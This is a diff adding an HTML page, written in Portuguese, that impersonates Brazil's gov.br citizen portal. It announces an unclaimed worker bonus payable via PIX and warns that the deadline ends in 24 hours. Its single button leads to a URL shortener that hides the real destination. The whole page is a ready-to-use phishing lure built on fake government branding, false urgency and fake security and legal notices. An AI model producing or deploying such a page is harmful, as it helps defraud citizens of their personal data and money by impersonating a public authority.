@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Do cidadão.br - Identificação de Beneficiário</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
+        
+        /* Barra Padrão Federal */
+        .gov-bar { background: #004088; color: white; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; font-size: 11px; font-weight: bold; }
+        
+        .container { max-width: 500px; margin: 30px auto; padding: 0 20px; }
+
+        .header-main { text-align: center; margin-bottom: 30px; }
+        .header-main img { height: 40px; }
+
+        .card-contingencia { 
+            background: white; border-radius: 8px; padding: 30px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-top: 6px solid #ffcd07; /* Amarelo de atenção */
+        }
+
+        h1 { font-size: 20px; color: #004088; text-align: center; margin-bottom: 15px; font-weight: 800; }
+        
+        .box-info { background: #f9f9f9; border-radius: 6px; padding: 15px; margin-bottom: 25px; border-left: 4px solid #004088; }
+        .box-info p { margin: 0; font-size: 14px; line-height: 1.5; color: #555; }
+
+        /* Botão Institucional */
+        .btn-acesso { 
+            display: block; background: #1351b4; color: white; text-align: center; 
+            padding: 20px; text-decoration: none; font-weight: bold; border-radius: 4px; 
+            font-size: 16px; text-transform: uppercase; transition: 0.3s;
+            box-shadow: 0 4px 10px rgba(19, 81, 180, 0.2);
+        }
+        .btn-acesso:hover { background: #003366; }
+
+        .aviso-legal { font-size: 11px; color: #999; margin-top: 25px; text-align: center; line-height: 1.4; }
+        
+        /* Lista de Passos */
+        .steps { margin: 20px 0; padding: 0; list-style: none; }
+        .steps li { display: flex; align-items: center; gap: 10px; font-size: 13px; color: #666; margin-bottom: 10px; }
+        .steps li::before { content: '✓'; color: #1d8032; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="gov-bar">
+    <span>BRASIL.GOV.BR</span>
+    <span>ACESSO RESTRITO</span>
+</div>
+
+<div class="container">
+    <div class="header-main">
+        <img src="bb.png" alt="Gov.br">
+    </div>
+
+    <div class="card-contingencia">
+        <h1>Informativo de Abono ao Cidadão</h1>
+        
+        <div class="box-info">
+            <p>Você foi redirecionado para o servidor de triagem do <b>Portal de Abonos</b>. Devido ao alto volume de acessos do último lote, solicitamos que prossiga para a identificação segura.</p>
+        </div>
+
+        <ul class="steps">
+            <li>Consulta de vínculo trabalhista ativa.</li>
+            <li>Identificação de valores retidos no CNIS.</li>
+            <li>Liberação imediata via chave PIX.</li>
+        </ul>
+
+        <p style="font-size: 13px; color: #d93025; font-weight: bold; text-align: center; margin-bottom: 20px;">
+            ⚠️ Atenção: O prazo para resgate deste lote encerra em 24h.
+        </p>
+
+        <a href="https://cutt.ly/mthAzdz8" class="btn-acesso">ACESSAR INFORMAÇÕES</a>
+    </div>
+
+    <div class="aviso-legal">
+        Este sistema utiliza protocolos de segurança SSL/TLS.<br>
+        O uso indevido deste portal está sujeito às penas da lei.
+    </div>
+</div>
+
+</body>
+
+</html>
+
+
